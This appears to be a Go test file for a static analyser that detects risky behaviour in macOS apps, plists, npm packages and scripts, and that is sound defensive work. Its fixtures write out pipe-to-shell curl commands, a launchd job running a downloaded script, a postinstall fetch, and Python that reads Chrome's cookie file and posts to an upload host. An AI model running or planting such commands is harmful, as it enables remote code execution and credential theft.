package report

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
	"howett.net/plist"
)

func TestREADMEProseDoesNotBecomeRunnableCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "README.md")
	writeFile(t, path, "Install by reading this example: curl https://readme.example/payload | sh\n")

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.ExecutionRoots) != 0 {
		t.Fatalf("README prose should not create execution roots: %#v", rep.ExecutionRoots)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("README prose should not create pipe-to-shell capability: %#v", rep.Capabilities)
	}
}

func TestDocumentationAppleScriptSyntaxDoesNotBecomeAppleScript(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "docs.md")
	writeFile(t, path, "The phrase do shell script \"curl https://docs.example/p | sh\" appears in documentation.\n")

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-pipe-interpreter") {
		t.Fatalf("documentation syntax should not become runnable behavior: %#v", rep.Capabilities)
	}
}

func TestFixtureScriptWithResourceAndUploadDoesNotCorroborate(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "tests", "fixture.py"), `import requests
open("~/Library/Application Support/Google/Chrome/Default/Cookies").read()
requests.post("https://fixture.example/upload", data=b"x")
`)

	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.browser-credential-collection") {
		t.Fatalf("test fixture should not produce credential collection: %#v", rep.Capabilities)
	}
}

func TestSeparateFunctionsDoNotCorroborateSensitiveResourceAndUpload(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sample.py")
	writeFile(t, path, `import requests
def collect():
    path = "~/Library/Application Support/Google/Chrome/Default/Cookies"
def send():
    requests.post("https://upload.example/path", data=b"x")
`)

	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.browser-credential-collection") {
		t.Fatalf("unrelated functions should not corroborate each other: %#v", rep.Capabilities)
	}
	for _, operation := range rep.Operations {
		if operation.SourceFunction != "" && operation.Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("function-scoped operation should remain unresolved without a call path: %#v", operation)
		}
	}
}

func TestBinaryAndXMLAppPlistsSelectSameExecutable(t *testing.T) {
	xmlRoot := t.TempDir()
	binRoot := t.TempDir()
	createMinimalAppWithInfo(t, filepath.Join(xmlRoot, "XML.app"), xmlInfoPlist("Runner"))
	createMinimalAppWithInfo(t, filepath.Join(binRoot, "Binary.app"), binaryPlist(t, map[string]any{"CFBundleExecutable": "Runner"}))

	xmlRep, err := InspectPath(filepath.Join(xmlRoot, "XML.app"), artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	binRep, err := InspectPath(filepath.Join(binRoot, "Binary.app"), artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, xmlRep, "app-main", "Runner")
	assertExecutionRecord(t, binRep, "app-main", "Runner")
}

func TestBinaryAndXMLLaunchdPlistsProduceSameOperations(t *testing.T) {
	root := t.TempDir()
	xmlPath := filepath.Join(root, "xml.plist")
	binPath := filepath.Join(root, "bin.plist")
	command := []string{"/bin/sh", "-c", "curl https://launch-bplist.example/p | sh"}
	writeFile(t, xmlPath, `<plist><dict><key>Label</key><string>com.example.xml</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl https://launch-bplist.example/p | sh</string></array></dict></plist>`)
	writeFile(t, binPath, string(binaryPlist(t, map[string]any{"Label": "com.example.bin", "ProgramArguments": command})))

	xmlRep, err := InspectPath(xmlPath, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	binRep, err := InspectPath(binPath, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, xmlRep, "macos.download-pipe-interpreter")
	assertCapability(t, binRep, "macos.download-pipe-interpreter")
}

func TestPackageLifecycleResolvesDistInstallScript(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "package.json"), `{"scripts":{"postinstall":"node dist/install.js"}}`)
	writeFile(t, filepath.Join(root, "dist", "install.js"), `fetch("https://dist-install.example/p")`)

	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertExecutionRecord(t, rep, "lifecycle-target", "postinstall")
	assertCapability(t, rep, "package.package-json-lifecycle")
	assertNetworkDestination(t, rep, "https://dist-install.example/p")
}

func TestSkippedDependencyDirectoryAppearsInCoverage(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "node_modules", "dep", "index.js"), `fetch("https://dep.example")`)

	rep, err := InspectPath(root, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	for _, node := range rep.ArtifactNodes {
		if strings.Contains(node.LogicalPath, "node_modules") && node.AnalyzeStatus == "skipped" {
			assertCoverage(t, rep, node.ID, "skipped")
			return
		}
	}
	t.Fatalf("skipped node_modules directory should be represented: nodes=%#v", rep.ArtifactNodes)
}

func TestInspectJSONDeterministic(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "install.sh")
	writeFile(t, path, "curl https://deterministic.example/p -o /tmp/p\nchmod +x /tmp/p\n/tmp/p\n")

	first, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	var a, b bytes.Buffer
	if err := WriteJSON(&a, first); err != nil {
		t.Fatal(err)
	}
	if err := WriteJSON(&b, second); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(a.Bytes(), b.Bytes()) {
		t.Fatalf("inspect JSON should be byte deterministic\nfirst=%s\nsecond=%s", a.String(), b.String())
	}
}

func binaryPlist(t *testing.T, value map[string]any) []byte {
	t.Helper()
	var buf bytes.Buffer
	encoder := plist.NewBinaryEncoder(&buf)
	if err := encoder.Encode(value); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func xmlInfoPlist(executable string) []byte {
	return []byte(`<plist><dict><key>CFBundleExecutable</key><string>` + executable + `</string></dict></plist>`)
}

func createMinimalAppWithInfo(t *testing.T, app string, info []byte) {
	t.Helper()
	macos := filepath.Join(app, "Contents", "MacOS")
	if err := mkdirAll(macos); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(app, "Contents", "Info.plist"), string(info))
	writeFileMode(t, filepath.Join(macos, "Runner"), "not a real macho", 0o700)
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	writeFileMode(t, path, content, 0o600)
}

func writeFileMode(t *testing.T, path, content string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
}

func mkdirAll(path string) error {
	return os.MkdirAll(path, 0o755)
}

func assertCoverage(t *testing.T, rep Report, nodeID, status string) {
	t.Helper()
	for _, coverage := range rep.Coverage {
		if coverage.NodeID == nodeID && coverage.Status == status {
			return
		}
	}
	t.Fatalf("missing coverage node=%s status=%s: %#v", nodeID, status, rep.Coverage)
}
